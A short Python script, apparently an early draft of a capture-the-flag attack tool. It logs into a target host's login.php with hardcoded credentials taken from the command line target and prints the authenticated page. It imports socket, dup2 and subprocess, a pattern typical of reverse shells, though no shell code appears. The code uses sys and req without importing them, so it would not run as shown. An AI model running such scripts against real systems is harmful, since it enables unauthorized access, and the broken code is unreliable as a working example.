import pprint
import socket
from os import dup2
from subprocess import run

tar_ip = sys.argv[1] #target IP

def Mino_web_engine():
    sess = req.Session()
    url = f'http://{tar_ip}/login.php'
    PostData = {'email': 'Daedalus', 'password': 'g2e55kh4ck5r'}
    sess.post(url, data=PostData)

    sec_url = f'http://{tar_ip}/index.php'
    RetReq = sess.get(sec_url)
    print(RetReq.text)

Mino_web_engine()
